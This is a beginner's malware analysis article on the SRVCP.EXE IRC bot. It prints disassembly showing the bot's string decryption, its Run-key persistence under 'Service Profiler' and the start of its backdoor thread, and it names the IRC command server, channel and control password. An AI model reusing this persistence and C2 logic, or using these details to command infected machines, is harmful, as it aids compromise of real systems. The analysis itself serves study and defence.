<h1>Analyzing The SRVCP.EXE IRC Bot</h1>

>This is my first article about malware anlysis. This malware is simple and easy to analyze, so for my first step of malware analysis articles i choose this. Let talk about on topic.

>In This articles I will start from code analysis and I will do behavior analysis during code analysis. Also, We will rewrite the code of this malware in.

<br>

>This is where the code of malware start from. In the first part of the function it will decrypt the string first so he can use it later.

<br>

```assembly

.text:004013F0                 push    ebp
.text:004013F1                 mov     ebp, esp
.text:004013F3                 sub     esp, 1B8h
.text:004013F9                 push    ebx
.text:004013FA                 push    esi
.text:004013FB                 push    edi
.text:004013FC                 lea     edi, [ebp+Data]
.text:004013FF                 lea     esi, aSrvcpExe  ; "srvcp.exe"
.text:00401405                 mov     ecx, 5
.text:0040140A                 rep movsw
.text:0040140D                 lea     edi, [ebp+ValueName]
.text:00401410                 lea     esi, aServiceProfile ; "Service Profiler"
.text:00401416                 mov     ecx, 11h
.text:0040141B                 rep movsb
.text:0040141D                 push    offset aNhlPwf  ; "nhl*pwf"
.text:00401422                 call    Encrypt_Decrypt
.text:00401427                 push    offset aAhkl    ; "|ahkl"
.text:0040142C                 call    Encrypt_Decrypt
.text:00401431                 push    offset aWtwgr   ; "wtwgr"
.text:00401436                 call    Encrypt_Decrypt
.text:0040143B                 push    offset aCdkk    ; "|cdkk"
.text:00401440                 call    Encrypt_Decrypt
.text:00401445                 push    offset aMfqece  ; "mfqEce"
.text:0040144A                 call    Encrypt_Decrypt
.text:0040144F                 push    offset aHPmfqece ; "~h`PmfqEce"
.text:00401454                 call    Encrypt_Decrypt
.text:00401459                 push    offset aVYMjQldkg ; "v}~y{*%mj&qldkg"
.text:0040145E                 call    Encrypt_Decrypt
.text:00401463                 push    offset Str      ; "'98;6"
.text:00401468                 call    Encrypt_Decrypt
.text:0040146D                 push    offset Str1     ; "O_ATU@VDE@"
.text:00401472                 call    Encrypt_Decrypt
.text:00401477                 push    offset buf
.text:0040147C                 call    Encrypt_Decrypt

```


>After Decrypting the string you will see like below. Some name which will use later for IRC and some configuration name.

```asm

.text:004013F0 push    ebp
.text:004013F1 mov     ebp, esp
.text:004013F3 sub     esp, 1B8h
.text:004013F9 push    ebx
.text:004013FA push    esi
.text:004013FB push    edi
.text:004013FC lea     edi, [ebp+Data]
.text:004013FF lea     esi, aSrvcpExe                  ; "srvcp.exe"
.text:00401405 mov     ecx, 5
.text:0040140A rep movsw
.text:0040140D lea     edi, [ebp+ValueName]
.text:00401410 lea     esi, aServiceProfile            ; "Service Profiler"
.text:00401416 mov     ecx, 11h
.text:0040141B rep movsb
.text:0040141D push    offset aNhlPwf                  ; "gus.ini"
.text:00401422 call    Encrypt_Decrypt
.text:00401427 push    offset aAhkl                    ; "mikey"
.text:0040142C call    Encrypt_Decrypt
.text:00401431 push    offset aWtwgr                   ; "setpr"
.text:00401436 call    Encrypt_Decrypt
.text:0040143B push    offset aCdkk                    ; "jiggy"
.text:00401440 call    Encrypt_Decrypt
.text:00401445 push    offset aMfqece                  ; "daFuck"
.text:0040144A call    Encrypt_Decrypt
.text:0040144F push    offset aHPmfqece                ; "daFuckWhat"
.text:00401454 call    Encrypt_Decrypt
.text:00401459 push    offset aVYMjQldkg               ; "fight me, pussy"
.text:0040145E call    Encrypt_Decrypt
.text:00401463 push    offset Str                      ; "irc.m"
.text:00401468 call    Encrypt_Decrypt
.text:0040146D push    offset Str1                     ; "AGGRESSIVE"
.text:00401472 call    Encrypt_Decrypt
.text:00401477 push    offset buf
.text:0040147C call    Encrypt_Decrypt
```

>In the second part of the function you will see that malware is modifying window registry for it persistent. Malware save its key under **SOFTWARE\Microsoft\Windows\CurrentVersion\Run** with name **Service Profiler** which will run the malware every time the system boot up.


```asm

.text:004014AE add     esp, 38h
.text:004014B1 lea     eax, [ebp+phkResult]
.text:004014B4 push    eax                             ; phkResult
.text:004014B5 push    0F003Fh                         ; samDesired
.text:004014BA push    0                               ; ulOptions
.text:004014BC push    offset SubKey                   ; "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
.text:004014C1 push    80000002h                       ; hKey
.text:004014C6 call    RegOpenKeyExA
.text:004014CB or      eax, eax
.text:004014CD jnz     short loc_4014FC
.text:004014CF lea     ecx, [ebp+Data]
.text:004014D2 or      eax, 0FFFFFFFFh
.text:004014D5
.text:004014D5 loc_4014D5:                             ; CODE XREF: main_func+EA↓j
.text:004014D5 inc     eax
.text:004014D6 cmp     byte ptr [ecx+eax], 0
.text:004014DA jnz     short loc_4014D5
.text:004014DC add     eax, 1
.text:004014DF push    eax                             ; cbData
.text:004014E0 lea     eax, [ebp+Data]
.text:004014E3 push    eax                             ; lpData
.text:004014E4 push    1                               ; dwType
.text:004014E6 push    0                               ; Reserved
.text:004014E8 lea     eax, [ebp+ValueName]
.text:004014EB push    eax                             ; lpValueName
.text:004014EC push    [ebp+phkResult]                 ; hKey
.text:004014EF call    RegSetValueExA
.text:004014F4 push    [ebp+phkResult]                 ; hKey
.text:004014F7 call    RegCloseKey

```

>In the third part of the function, it will do network related things like connecting to IRC, Receving Command, etc .. . Let's check the final part. You will see that the malware will try to intiates to use the ***Winsocket dll***. If fail to load the program will exist. Otherwise It will do network related things in a new thread.

```asm

.text:004014FC loc_4014FC:                             ; CODE XREF: main_func+DD↑j
.text:004014FC lea     eax, [ebp+WSAData]
.text:00401502 push    eax                             ; lpWSAData
.text:00401503 push    2                               ; wVersionRequested
.text:00401505 call    WSAStartup
.text:0040150A or      eax, eax
.text:0040150C jz      short loc_401519
.text:0040150E push    0                               ; uExitCode
.text:00401510 call    ExitProcess
.text:00401515 ; ---------------------------------------------------------------------------
.text:00401515 xor     eax, eax
.text:00401517 jmp     short loc_401568
.text:00401519 ; ---------------------------------------------------------------------------
.text:00401519
.text:00401519 loc_401519:                             ; CODE XREF: main_func+11C↑j
.text:00401519 lea     eax, [ebp+ThreadId]
.text:0040151C push    eax                             ; lpThreadId
.text:0040151D push    0                               ; dwCreationFlags
.text:0040151F push    0                               ; lpParameter
.text:00401521 push    offset backdoor_job             ; lpStartAddress
.text:00401526 push    0                               ; dwStackSize
.text:00401528 push    0                               ; lpThreadAttributes
.text:0040152A call    CreateThread
.text:0040152F mov     ebx, eax
.text:00401531 jmp     short loc_401546
.text:00401533 ; ---------------------------------------------------------------------------
.text:00401533
.text:00401533 loc_401533:                             ; CODE XREF: main_func+162↓j
.text:00401533 cmp     [ebp+ThreadId], 103h
.text:0040153A jnz     short loc_401554
.text:0040153C push    1F4h                            ; dwMilliseconds
.text:00401541 call    Sleep
.text:00401546
.text:00401546 loc_401546:                             ; CODE XREF: main_func+141↑j
.text:00401546 lea     eax, [ebp+ThreadId]
.text:00401549 push    eax                             ; lpExitCode
.text:0040154A push    ebx                             ; hThread
.text:0040154B call    GetExitCodeThread
.text:00401550 or      eax, eax
.text:00401552 jnz     short loc_401533
.text:00401554
.text:00401554 loc_401554:                             ; CODE XREF: main_func+14A↑j
.text:00401554 push    ebx                             ; hObject
.text:00401555 call    CloseHandle
.text:0040155A call    WSACleanup
.text:0040155F push    0                               ; uExitCode
.text:00401561 call    ExitProcess
```


>In network related section there is three job done by Trojan. First is Listening At port 133 for indent request. Second is Registering The nick name ***mikey*** every three second. If the nick name is already use the  Trojan generate random name and use it. It will try to connect to **irc.mcs.net** at port 6667 and join a channel called ```#daFuck``` and wait to receive the command. the command must be encrypted before sending to the Trojan. In addition to command the trojan you must provide the password to access. The password also must be encrypted. So the format must be like ``` encrypted_password encrypted_command ``` 

>Password Encryption Algorithm 

>It use our hostname to encrypt and decrypt the password. The decrypted password must be ***jiggy***.

>Command Encryption Algorithm

> **NOTE :** I Still Need to Solve this algorithm